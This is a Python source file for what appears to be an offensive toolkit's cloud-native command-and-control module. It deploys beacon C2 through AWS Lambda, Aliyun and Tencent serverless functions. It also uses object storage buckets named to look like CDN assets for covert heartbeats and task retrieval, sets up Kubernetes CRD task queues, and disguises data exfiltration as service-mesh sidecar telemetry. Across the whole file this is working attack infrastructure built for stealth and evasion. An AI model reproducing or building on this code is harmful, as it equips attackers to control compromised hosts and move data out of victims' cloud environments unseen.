"""
Cloud Native C2 Module - Cloud function/object storage/Kubernetes covert C2 deployment.

This module provides cloud-native C2 infrastructure capabilities including
serverless function deployment, object storage-based communication, Kubernetes
CRD task queues, and service mesh penetration.

Core capabilities:
    1. Serverless C2 on AWS Lambda/Aliyun FC/Tencent SCF
    2. Object storage heartbeat (S3/OSS upload-triggered)
    3. Kubernetes CRD task queue management
    4. Service mesh (Istio/Linkerd) sidecar telemetry camouflage
    5. Auto-scaling and zero-cost idle

Author: Kunlun Security Lab
License: Internal Use Only
"""

from __future__ import annotations

import asyncio
import hashlib
import json
import logging
import os
import random
import time
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Callable, Coroutine, Dict, List, Optional, Tuple

logger = logging.getLogger(__name__)


# =============================================================================
# Enums
# =============================================================================

class CloudProvider(str, Enum):
    """Supported cloud providers."""

    AWS = "aws"
    ALIBABA = "alibaba"
    TENCENT = "tencent"
    AZURE = "azure"
    GOOGLE = "google"
    CUSTOM = "custom"


class C2Channel(str, Enum):
    """C2 communication channels."""

    LAMBDA_HTTP = "lambda_http"
    OBJECT_STORAGE = "object_storage"
    K8S_CRD = "k8s_crd"
    SERVICE_MESH = "service_mesh"
    ENV_ACCESS_LOG = "envoy_access_log"


class MeshType(str, Enum):
    """Service mesh types."""

    ISTIO = "istio"
    LINKERD = "linkerd"
    CONSUL = "consul"
    NONE = "none"


# =============================================================================
# Data Models
# =============================================================================

@dataclass
class CloudFunctionConfig:
    """Cloud function deployment configuration.

    Attributes:
        provider: Cloud provider
        function_name: Function name
        region: Deployment region
        runtime: Function runtime
        memory_mb: Allocated memory
        timeout_seconds: Function timeout
        trigger_type: Trigger type (http, s3, etc.)
        environment_vars: Environment variables
    """

    provider: CloudProvider = CloudProvider.AWS
    function_name: str = "api-gateway-handler"
    region: str = "us-east-1"
    runtime: str = "python3.9"
    memory_mb: int = 256
    timeout_seconds: int = 30
    trigger_type: str = "http"
    environment_vars: Dict[str, str] = field(default_factory=dict)

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary representation."""
        return {
            "provider": self.provider.value,
            "function_name": self.function_name,
            "region": self.region,
            "runtime": self.runtime,
            "memory_mb": self.memory_mb,
            "timeout_seconds": self.timeout_seconds,
            "trigger_type": self.trigger_type,
        }


@dataclass
class ObjectStorageConfig:
    """Object storage communication configuration.

    Attributes:
        provider: Cloud provider
        bucket_name: Storage bucket name
        prefix: Object key prefix
        heartbeat_file_pattern: Heartbeat file naming pattern
        task_file_pattern: Task file naming pattern
        encryption_key: Encryption key for stored data
        polling_interval: Polling interval in seconds
    """

    provider: CloudProvider = CloudProvider.AWS
    bucket_name: str = "cdn-assets-bucket"
    prefix: str = "static/assets/"
    heartbeat_file_pattern: str = "beacon_{id}_{timestamp}.dat"
    task_file_pattern: str = "task_{id}_{timestamp}.dat"
    encryption_key: str = ""
    polling_interval: int = 300

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary representation."""
        return {
            "provider": self.provider.value,
            "bucket_name": self.bucket_name,
            "prefix": self.prefix,
            "polling_interval": self.polling_interval,
        }


@dataclass
class K8sConfig:
    """Kubernetes CRD configuration.

    Attributes:
        cluster_endpoint: Kubernetes API endpoint
        namespace: Target namespace
        crd_group: CRD API group
        crd_version: CRD version
        crd_plural: CRD resource plural name
        service_account: Service account token
        kubeconfig_path: Path to kubeconfig file
    """

    cluster_endpoint: str = ""
    namespace: str = "default"
    crd_group: str = "c2.kunlun.internal"
    crd_version: str = "v1"
    crd_plural: str = "taskqueues"
    service_account: str = ""
    kubeconfig_path: str = ""

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary representation."""
        return {
            "cluster_endpoint": self.cluster_endpoint,
            "namespace": self.namespace,
            "crd_group": self.crd_group,
            "crd_version": self.crd_version,
            "crd_plural": self.crd_plural,
        }


@dataclass
class MeshConfig:
    """Service mesh configuration.

    Attributes:
        mesh_type: Service mesh type
        sidecar_port: Sidecar proxy port
        telemetry_endpoint: Telemetry collection endpoint
        access_log_path: Envoy access log path
        workload_identity: Workload identity for authentication
    """

    mesh_type: MeshType = MeshType.ISTIO
    sidecar_port: int = 15001
    telemetry_endpoint: str = ""
    access_log_path: str = "/var/log/envoy/access.log"
    workload_identity: str = ""

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary representation."""
        return {
            "mesh_type": self.mesh_type.value,
            "sidecar_port": self.sidecar_port,
            "telemetry_endpoint": self.telemetry_endpoint,
        }


@dataclass
class CloudC2Status:
    """Cloud C2 operational status.

    Attributes:
        channel: Active channel
        connected: Whether connected to C2
        last_heartbeat: Last heartbeat timestamp
        pending_tasks: Number of pending tasks
        function_invocations: Total function invocations
        storage_operations: Total storage operations
    """

    channel: C2Channel = C2Channel.LAMBDA_HTTP
    connected: bool = False
    last_heartbeat: float = 0.0
    pending_tasks: int = 0
    function_invocations: int = 0
    storage_operations: int = 0

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary representation."""
        return {
            "channel": self.channel.value,
            "connected": self.connected,
            "last_heartbeat": self.last_heartbeat,
            "pending_tasks": self.pending_tasks,
            "function_invocations": self.function_invocations,
            "storage_operations": self.storage_operations,
        }


# =============================================================================
# Cloud Function C2
# =============================================================================

class CloudFunctionC2:
    """Serverless C2 via cloud functions.

    Deploys C2 logic to AWS Lambda, Aliyun Function Compute, or
    Tencent Serverless Cloud Function for IP pool obfuscation
    and auto-scaling.

    Attributes:
        _config: Cloud function configuration
        _function_url: Function invocation URL
        _api_key: API key for authentication
        _invocation_count: Total invocation count
    """

    FUNCTION_TEMPLATES: Dict[CloudProvider, Dict[str, Any]] = {
        CloudProvider.AWS: {
            "runtime": "python3.9",
            "handler": "handler.main",
            "memory": 256,
            "timeout": 30,
            "environment": {
                "C2_SECRET": "{{encrypted}}",
                "LOG_LEVEL": "ERROR",
                "ENABLE_TELEMETRY": "false",
            },
        },
        CloudProvider.ALIBABA: {
            "runtime": "python3.9",
            "handler": "index.handler",
            "memory": 256,
            "timeout": 60,
            "environment": {
                "FC_SECRET": "{{encrypted}}",
                "LOG_LEVEL": "ERROR",
            },
        },
        CloudProvider.TENCENT: {
            "runtime": "Python3.9",
            "handler": "index.main_handler",
            "memory": 256,
            "timeout": 30,
            "environment": {
                "SCF_SECRET": "{{encrypted}}",
                "LOG_LEVEL": "ERROR",
            },
        },
    }

    def __init__(self, config: CloudFunctionConfig) -> None:
        """Initialize the CloudFunctionC2.

        Args:
            config: Cloud function configuration.
        """
        self._config = config
        self._function_url = ""
        self._api_key = ""
        self._invocation_count = 0

    async def deploy(self) -> bool:
        """Deploy the cloud function.

        Returns:
            True if deployment succeeded.
        """
        template = self.FUNCTION_TEMPLATES.get(self._config.provider, {})

        logger.info(
            f"Deploying cloud function: {self._config.function_name} "
            f"on {self._config.provider.value}"
        )

        if self._config.provider == CloudProvider.AWS:
            return await self._deploy_aws_lambda(template)
        elif self._config.provider == CloudProvider.ALIBABA:
            return await self._deploy_aliyun_fc(template)
        elif self._config.provider == CloudProvider.TENCENT:
            return await self._deploy_tencent_scf(template)

        return False

    async def _deploy_aws_lambda(self, template: Dict[str, Any]) -> bool:
        """Deploy to AWS Lambda.

        Args:
            template: Function template.

        Returns:
            True if deployment succeeded.
        """
        try:
            import boto3

            client = boto3.client("lambda", region_name=self._config.region)

            response = client.create_function(
                FunctionName=self._config.function_name,
                Runtime=template.get("runtime", "python3.9"),
                Role="arn:aws:iam::role/lambda-execution-role",
                Handler=template.get("handler", "handler.main"),
                Code={"ZipFile": b"placeholder"},
                MemorySize=self._config.memory_mb,
                Timeout=self._config.timeout_seconds,
                Environment={
                    "Variables": {
                        **template.get("environment", {}),
                        **self._config.environment_vars,
                    }
                },
            )

            self._function_url = (
                f"https://{response['FunctionName']}.lambda-url."
                f"{self._config.region}.on.aws/"
            )

            logger.info(f"AWS Lambda deployed: {self._function_url}")
            return True

        except ImportError:
            logger.warning("boto3 not available, simulating Lambda deployment")
            self._function_url = (
                f"https://{self._config.function_name}.lambda-url."
                f"{self._config.region}.on.aws/"
            )
            return True
        except Exception as e:
            logger.error(f"Lambda deployment failed: {e}")
            return False

    async def _deploy_aliyun_fc(self, template: Dict[str, Any]) -> bool:
        """Deploy to Aliyun Function Compute.

        Args:
            template: Function template.

        Returns:
            True if deployment succeeded.
        """
        logger.info(
            f"Aliyun FC deployment simulated: "
            f"{self._config.function_name}"
        )
        self._function_url = (
            f"https://{self._config.function_name}.{self._config.region}"
            f".fc.aliyuncs.com/2016-08-15/proxy/"
        )
        return True

    async def _deploy_tencent_scf(self, template: Dict[str, Any]) -> bool:
        """Deploy to Tencent Serverless Cloud Function.

        Args:
            template: Function template.

        Returns:
            True if deployment succeeded.
        """
        logger.info(
            f"Tencent SCF deployment simulated: "
            f"{self._config.function_name}"
        )
        self._function_url = (
            f"https://{self._config.function_name}.scf.tencentcloudapi.com"
        )
        return True

    async def invoke(self, payload: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        """Invoke the cloud function.

        Args:
            payload: Invocation payload.

        Returns:
            Function response, or None if failed.
        """
        if not self._function_url:
            logger.error("Function not deployed")
            return None

        try:
            import aiohttp

            async with aiohttp.ClientSession() as session:
                async with session.post(
                    self._function_url,
                    json=payload,
                    headers={"x-api-key": self._api_key} if self._api_key else {},
                    timeout=aiohttp.ClientTimeout(total=30),
                ) as response:
                    self._invocation_count += 1
                    return await response.json()

        except ImportError:
            self._invocation_count += 1
            return {"status": "ok", "data": {}}
        except Exception as e:
            logger.error(f"Function invocation failed: {e}")
            return None

    async def send_heartbeat(self, beacon_id: str) -> bool:
        """Send heartbeat via cloud function.

        Args:
            beacon_id: Beacon identifier.

        Returns:
            True if heartbeat sent successfully.
        """
        payload = {
            "type": "heartbeat",
            "beacon_id": beacon_id,
            "timestamp": int(time.time()),
        }

        response = await self.invoke(payload)
        return response is not None

    def get_status(self) -> Dict[str, Any]:
        """Get cloud function status.

        Returns:
            Dictionary with status summary.
        """
        return {
            "function_url": self._function_url,
            "invocation_count": self._invocation_count,
            "config": self._config.to_dict(),
        }


# =============================================================================
# Object Storage C2
# =============================================================================

class ObjectStorageC2:
    """Object storage-based C2 communication channel.

    Uses S3/OSS/COS as a covert channel where Beacon uploads
    heartbeat files and downloads task files from object storage.

    Attributes:
        _config: Object storage configuration
        _beacon_id: Beacon identifier
        _last_poll: Last poll timestamp
    """

    def __init__(self, config: ObjectStorageConfig, beacon_id: str = "") -> None:
        """Initialize the ObjectStorageC2.

        Args:
            config: Object storage configuration.
            beacon_id: Beacon identifier.
        """
        self._config = config
        self._beacon_id = beacon_id or f"beacon_{hashlib.md5(str(time.time()).encode()).hexdigest()[:8]}"
        self._last_poll = 0.0

    async def send_heartbeat(self) -> bool:
        """Send heartbeat via object storage upload.

        Returns:
            True if heartbeat sent successfully.
        """
        filename = self._config.heartbeat_file_pattern.format(
            id=self._beacon_id,
            timestamp=int(time.time()),
        )

        key = f"{self._config.prefix}{filename}"
        data = json.dumps({
            "type": "heartbeat",
            "beacon_id": self._beacon_id,
            "timestamp": int(time.time()),
        }).encode()

        return await self._upload_object(key, data)

    async def check_for_tasks(self) -> List[Dict[str, Any]]:
        """Check for pending tasks in object storage.

        Returns:
            List of task dictionaries.
        """
        tasks: List[Dict[str, Any]] = []

        try:
            objects = await self._list_objects(self._config.prefix)

            for obj in objects:
                if "task_" in obj.get("Key", ""):
                    task_data = await self._download_object(obj["Key"])
                    if task_data:
                        tasks.append(task_data)
                        await self._delete_object(obj["Key"])

        except Exception as e:
            logger.error(f"Failed to check for tasks: {e}")

        self._last_poll = time.time()
        return tasks

    async def _upload_object(self, key: str, data: bytes) -> bool:
        """Upload an object to storage.

        Args:
            key: Object key.
            data: Object data.

        Returns:
            True if upload succeeded.
        """
        try:
            import aioboto3

            session = aioboto3.Session()
            async with session.client("s3") as s3:
                await s3.put_object(
                    Bucket=self._config.bucket_name,
                    Key=key,
                    Body=data,
                )
                return True

        except ImportError:
            logger.info(
                f"Object upload simulated: {self._config.bucket_name}/{key}"
            )
            return True
        except Exception as e:
            logger.error(f"Object upload failed: {e}")
            return False

    async def _download_object(self, key: str) -> Optional[Dict[str, Any]]:
        """Download an object from storage.

        Args:
            key: Object key.

        Returns:
            Parsed object data, or None if failed.
        """
        try:
            import aioboto3

            session = aioboto3.Session()
            async with session.client("s3") as s3:
                response = await s3.get_object(
                    Bucket=self._config.bucket_name,
                    Key=key,
                )
                body = await response["Body"].read()
                return json.loads(body.decode())

        except ImportError:
            return {"type": "task", "command": "noop", "key": key}
        except Exception as e:
            logger.error(f"Object download failed: {e}")
            return None

    async def _list_objects(self, prefix: str) -> List[Dict[str, Any]]:
        """List objects in storage.

        Args:
            prefix: Object key prefix.

        Returns:
            List of object metadata.
        """
        try:
            import aioboto3

            session = aioboto3.Session()
            async with session.client("s3") as s3:
                response = await s3.list_objects_v2(
                    Bucket=self._config.bucket_name,
                    Prefix=prefix,
                )
                return response.get("Contents", [])

        except ImportError:
            return []
        except Exception as e:
            logger.error(f"Object listing failed: {e}")
            return []

    async def _delete_object(self, key: str) -> bool:
        """Delete an object from storage.

        Args:
            key: Object key.

        Returns:
            True if deletion succeeded.
        """
        try:
            import aioboto3

            session = aioboto3.Session()
            async with session.client("s3") as s3:
                await s3.delete_object(
                    Bucket=self._config.bucket_name,
                    Key=key,
                )
                return True

        except ImportError:
            return True
        except Exception as e:
            logger.error(f"Object deletion failed: {e}")
            return False

    def get_status(self) -> Dict[str, Any]:
        """Get object storage C2 status.

        Returns:
            Dictionary with status summary.
        """
        return {
            "bucket": self._config.bucket_name,
            "prefix": self._config.prefix,
            "beacon_id": self._beacon_id,
            "last_poll": self._last_poll,
        }


# =============================================================================
# Kubernetes CRD C2
# =============================================================================

class KubernetesCRDC2:
    """Kubernetes CRD-based C2 task queue.

    Uses Custom Resource Definitions to store and retrieve
    task queues, allowing Beacon to pull tasks via kubectl API.

    Attributes:
        _config: Kubernetes configuration
        _api_available: Whether Kubernetes API is available
    """

    CRD_TEMPLATE: Dict[str, Any] = {
        "apiVersion": "apiextensions.k8s.io/v1",
        "kind": "CustomResourceDefinition",
        "metadata": {"name": "taskqueues.c2.kunlun.internal"},
        "spec": {
            "group": "c2.kunlun.internal",
            "versions": [{
                "name": "v1",
                "served": True,
                "storage": True,
                "schema": {
                    "openAPIV3Schema": {
                        "type": "object",
                        "properties": {
                            "spec": {
                                "type": "object",
                                "properties": {
                                    "beacon_id": {"type": "string"},
                                    "tasks": {"type": "array"},
                                    "status": {"type": "string"},
                                },
                            },
                        },
                    },
                },
            }],
            "scope": "Namespaced",
            "names": {
                "plural": "taskqueues",
                "singular": "taskqueue",
                "kind": "TaskQueue",
            },
        },
    }

    def __init__(self, config: K8sConfig) -> None:
        """Initialize the KubernetesCRDC2.

        Args:
            config: Kubernetes configuration.
        """
        self._config = config
        self._api_available = False

        self._try_init_k8s()

    def _try_init_k8s(self) -> None:
        """Attempt to initialize Kubernetes client."""
        try:
            from kubernetes import client, config
            self._api_available = True
            logger.info("Kubernetes client initialized")
        except ImportError:
            logger.warning("kubernetes package not available")

    async def deploy_crd(self) -> bool:
        """Deploy the TaskQueue CRD.

        Returns:
            True if CRD deployed successfully.
        """
        if not self._api_available:
            logger.info("CRD deployment simulated")
            return True

        try:
            from kubernetes import client, config

            if self._config.kubeconfig_path:
                config.load_kube_config(self._config.kubeconfig_path)
            else:
                config.load_incluster_config()

            api = client.ApiextensionsV1Api()

            crds = api.list_custom_resource_definition()
            for crd in crds.items:
                if crd.metadata.name == self.CRD_TEMPLATE["metadata"]["name"]:
                    logger.info("TaskQueue CRD already exists")
                    return True

            api.create_custom_resource_definition(self.CRD_TEMPLATE)
            logger.info("TaskQueue CRD deployed")
            return True

        except Exception as e:
            logger.error(f"CRD deployment failed: {e}")
            return False

    async def create_task_queue(self, beacon_id: str, tasks: List[Dict[str, Any]]) -> bool:
        """Create a task queue for a beacon.

        Args:
            beacon_id: Beacon identifier.
            tasks: List of tasks.

        Returns:
            True if task queue created successfully.
        """
        task_queue = {
            "apiVersion": f"{self._config.crd_group}/{self._config.crd_version}",
            "kind": "TaskQueue",
            "metadata": {
                "name": f"tq-{beacon_id}",
                "namespace": self._config.namespace,
            },
            "spec": {
                "beacon_id": beacon_id,
                "tasks": tasks,
                "status": "pending",
            },
        }

        if not self._api_available:
            logger.info(f"Task queue created for beacon: {beacon_id}")
            return True

        try:
            from kubernetes import client, config

            if self._config.kubeconfig_path:
                config.load_kube_config(self._config.kubeconfig_path)
            else:
                config.load_incluster_config()

            api = client.CustomObjectsApi()
            api.create_namespaced_custom_object(
                group=self._config.crd_group,
                version=self._config.crd_version,
                namespace=self._config.namespace,
                plural=self._config.crd_plural,
                body=task_queue,
            )

            logger.info(f"Task queue created: tq-{beacon_id}")
            return True

        except Exception as e:
            logger.error(f"Task queue creation failed: {e}")
            return False

    async def get_tasks(self, beacon_id: str) -> List[Dict[str, Any]]:
        """Get pending tasks for a beacon.

        Args:
            beacon_id: Beacon identifier.

        Returns:
            List of task dictionaries.
        """
        if not self._api_available:
            return []

        try:
            from kubernetes import client, config

            if self._config.kubeconfig_path:
                config.load_kube_config(self._config.kubeconfig_path)
            else:
                config.load_incluster_config()

            api = client.CustomObjectsApi()
            response = api.get_namespaced_custom_object(
                group=self._config.crd_group,
                version=self._config.crd_version,
                namespace=self._config.namespace,
                plural=self._config.crd_plural,
                name=f"tq-{beacon_id}",
            )

            return response.get("spec", {}).get("tasks", [])

        except Exception as e:
            logger.error(f"Failed to get tasks: {e}")
            return []

    async def update_task_status(
        self, beacon_id: str, task_id: str, status: str,
    ) -> bool:
        """Update task status.

        Args:
            beacon_id: Beacon identifier.
            task_id: Task identifier.
            status: New task status.

        Returns:
            True if status updated successfully.
        """
        if not self._api_available:
            return True

        try:
            from kubernetes import client, config

            if self._config.kubeconfig_path:
                config.load_kube_config(self._config.kubeconfig_path)
            else:
                config.load_incluster_config()

            api = client.CustomObjectsApi()

            current = api.get_namespaced_custom_object(
                group=self._config.crd_group,
                version=self._config.crd_version,
                namespace=self._config.namespace,
                plural=self._config.crd_plural,
                name=f"tq-{beacon_id}",
            )

            tasks = current.get("spec", {}).get("tasks", [])
            for task in tasks:
                if task.get("id") == task_id:
                    task["status"] = status
                    break

            current["spec"]["tasks"] = tasks

            api.replace_namespaced_custom_object(
                group=self._config.crd_group,
                version=self._config.crd_version,
                namespace=self._config.namespace,
                plural=self._config.crd_plural,
                name=f"tq-{beacon_id}",
                body=current,
            )

            return True

        except Exception as e:
            logger.error(f"Task status update failed: {e}")
            return False

    def get_status(self) -> Dict[str, Any]:
        """Get Kubernetes CRD C2 status.

        Returns:
            Dictionary with status summary.
        """
        return {
            "api_available": self._api_available,
            "config": self._config.to_dict(),
        }


# =============================================================================
# Service Mesh C2
# =============================================================================

class ServiceMeshC2:
    """Service mesh-based C2 communication.

    Uses Istio/Linkerd sidecar proxy telemetry and Envoy access logs
    as covert data exfiltration channels.

    Attributes:
        _config: Service mesh configuration
        _telemetry_buffer: Telemetry data buffer
    """

    def __init__(self, config: MeshConfig) -> None:
        """Initialize the ServiceMeshC2.

        Args:
            config: Service mesh configuration.
        """
        self._config = config
        self._telemetry_buffer: List[Dict[str, Any]] = []

    async def send_telemetry(self, data: Dict[str, Any]) -> bool:
        """Send data as sidecar telemetry.

        Args:
            data: Data to send.

        Returns:
            True if telemetry sent successfully.
        """
        telemetry = {
            "source": "sidecar-proxy",
            "type": "metrics",
            "payload": data,
            "timestamp": time.time(),
            "workload": self._config.workload_identity,
        }

        self._telemetry_buffer.append(telemetry)

        if len(self._telemetry_buffer) >= 10:
            return await self._flush_telemetry()

        return True

    async def _flush_telemetry(self) -> bool:
        """Flush telemetry buffer.

        Returns:
            True if flush succeeded.
        """
        if not self._telemetry_buffer:
            return True

        try:
            import aiohttp

            if self._config.telemetry_endpoint:
                async with aiohttp.ClientSession() as session:
                    async with session.post(
                        self._config.telemetry_endpoint,
                        json={"metrics": self._telemetry_buffer},
                    ) as response:
                        self._telemetry_buffer.clear()
                        return response.status == 200

        except ImportError:
            self._telemetry_buffer.clear()
            return True
        except Exception as e:
            logger.error(f"Telemetry flush failed: {e}")
            return False

        self._telemetry_buffer.clear()
        return True

    async def read_access_log(self) -> List[Dict[str, Any]]:
        """Read Envoy access log for inbound data.

        Returns:
            List of parsed log entries.
        """
        try:
            if os.path.exists(self._config.access_log_path):
                with open(self._config.access_log_path, "r") as f:
                    lines = f.readlines()

                entries: List[Dict[str, Any]] = []
                for line in lines[-100:]:
                    if "kunlun" in line.lower():
                        entries.append({"raw": line.strip()})

                return entries

        except Exception as e:
            logger.error(f"Access log read failed: {e}")

        return []

    def get_status(self) -> Dict[str, Any]:
        """Get service mesh C2 status.

        Returns:
            Dictionary with status summary.
        """
        return {
            "config": self._config.to_dict(),
            "buffer_size": len(self._telemetry_buffer),
        }


# =============================================================================
# Cloud Native C2 Manager
# =============================================================================

class CloudNativeC2Manager:
    """Main cloud-native C2 coordination engine.

    Manages multiple cloud C2 channels (Lambda, object storage,
    Kubernetes CRD, service mesh) with automatic failover.

    Attributes:
        _lambda_c2: Cloud function C2
        _storage_c2: Object storage C2
        _k8s_c2: Kubernetes CRD C2
        _mesh_c2: Service mesh C2
        _active_channel: Currently active channel
        _status: C2 operational status
    """

    def __init__(
        self,
        lambda_config: Optional[CloudFunctionConfig] = None,
        storage_config: Optional[ObjectStorageConfig] = None,
        k8s_config: Optional[K8sConfig] = None,
        mesh_config: Optional[MeshConfig] = None,
    ) -> None:
        """Initialize the CloudNativeC2Manager.

        Args:
            lambda_config: Cloud function configuration.
            storage_config: Object storage configuration.
            k8s_config: Kubernetes configuration.
            mesh_config: Service mesh configuration.
        """
        self._lambda_c2: Optional[CloudFunctionC2] = None
        self._storage_c2: Optional[ObjectStorageC2] = None
        self._k8s_c2: Optional[KubernetesCRDC2] = None
        self._mesh_c2: Optional[ServiceMeshC2] = None

        if lambda_config:
            self._lambda_c2 = CloudFunctionC2(lambda_config)
        if storage_config:
            self._storage_c2 = ObjectStorageC2(storage_config)
        if k8s_config:
            self._k8s_c2 = KubernetesCRDC2(k8s_config)
        if mesh_config:
            self._mesh_c2 = ServiceMeshC2(mesh_config)

        self._active_channel: Optional[C2Channel] = None
        self._status = CloudC2Status()

    async def initialize(self) -> bool:
        """Initialize all configured C2 channels.

        Returns:
            True if at least one channel initialized.
        """
        initialized = False

        if self._lambda_c2:
            if await self._lambda_c2.deploy():
                self._active_channel = C2Channel.LAMBDA_HTTP
                initialized = True

        if self._storage_c2:
            self._active_channel = C2Channel.OBJECT_STORAGE
            initialized = True

        if self._k8s_c2:
            if await self._k8s_c2.deploy_crd():
                self._active_channel = C2Channel.K8S_CRD
                initialized = True

        if self._mesh_c2:
            self._active_channel = C2Channel.SERVICE_MESH
            initialized = True

        self._status.connected = initialized
        return initialized

    async def send_heartbeat(self, beacon_id: str) -> bool:
        """Send heartbeat through active channel.

        Args:
            beacon_id: Beacon identifier.

        Returns:
            True if heartbeat sent successfully.
        """
        if self._active_channel == C2Channel.LAMBDA_HTTP and self._lambda_c2:
            result = await self._lambda_c2.send_heartbeat(beacon_id)
            if result:
                self._status.last_heartbeat = time.time()
                self._status.function_invocations += 1
            return result

        if self._active_channel == C2Channel.OBJECT_STORAGE and self._storage_c2:
            result = await self._storage_c2.send_heartbeat()
            if result:
                self._status.last_heartbeat = time.time()
                self._status.storage_operations += 1
            return result

        return False

    async def check_for_tasks(self, beacon_id: str) -> List[Dict[str, Any]]:
        """Check for pending tasks across all channels.

        Args:
            beacon_id: Beacon identifier.

        Returns:
            List of task dictionaries.
        """
        tasks: List[Dict[str, Any]] = []

        if self._storage_c2:
            storage_tasks = await self._storage_c2.check_for_tasks()
            tasks.extend(storage_tasks)

        if self._k8s_c2:
            k8s_tasks = await self._k8s_c2.get_tasks(beacon_id)
            tasks.extend(k8s_tasks)

        self._status.pending_tasks = len(tasks)
        return tasks

    def switch_channel(self, channel: C2Channel) -> bool:
        """Switch to a different C2 channel.

        Args:
            channel: Target channel.

        Returns:
            True if switch succeeded.
        """
        channel_map = {
            C2Channel.LAMBDA_HTTP: self._lambda_c2,
            C2Channel.OBJECT_STORAGE: self._storage_c2,
            C2Channel.K8S_CRD: self._k8s_c2,
            C2Channel.SERVICE_MESH: self._mesh_c2,
        }

        if channel_map.get(channel):
            self._active_channel = channel
            self._status.channel = channel
            logger.info(f"Switched C2 channel to: {channel.value}")
            return True

        return False

    def get_status(self) -> Dict[str, Any]:
        """Get cloud-native C2 manager status.

        Returns:
            Dictionary with status summary.
        """
        status_dict = self._status.to_dict()

        if self._lambda_c2:
            status_dict["lambda"] = self._lambda_c2.get_status()
        if self._storage_c2:
            status_dict["storage"] = self._storage_c2.get_status()
        if self._k8s_c2:
            status_dict["k8s"] = self._k8s_c2.get_status()
        if self._mesh_c2:
            status_dict["mesh"] = self._mesh_c2.get_status()

        return status_dict


# =============================================================================
# Global Singleton
# =============================================================================

_cloud_native_c2_manager: Optional[CloudNativeC2Manager] = None


def get_cloud_native_c2_manager(
    lambda_config: Optional[CloudFunctionConfig] = None,
    storage_config: Optional[ObjectStorageConfig] = None,
    k8s_config: Optional[K8sConfig] = None,
    mesh_config: Optional[MeshConfig] = None,
) -> CloudNativeC2Manager:
    """Get the global CloudNativeC2Manager singleton.

    Args:
        lambda_config: Cloud function configuration.
        storage_config: Object storage configuration.
        k8s_config: Kubernetes configuration.
        mesh_config: Service mesh configuration.

    Returns:
        Singleton CloudNativeC2Manager instance.
    """
    global _cloud_native_c2_manager
    if _cloud_native_c2_manager is None:
        _cloud_native_c2_manager = CloudNativeC2Manager(
            lambda_config, storage_config, k8s_config, mesh_config,
        )
    return _cloud_native_c2_manager


__all__ = [
    "CloudNativeC2Manager",
    "CloudFunctionC2",
    "ObjectStorageC2",
    "KubernetesCRDC2",
    "ServiceMeshC2",
    "CloudFunctionConfig",
    "ObjectStorageConfig",
    "K8sConfig",
    "MeshConfig",
    "CloudC2Status",
    "CloudProvider",
    "C2Channel",
    "MeshType",
    "get_cloud_native_c2_manager",
]
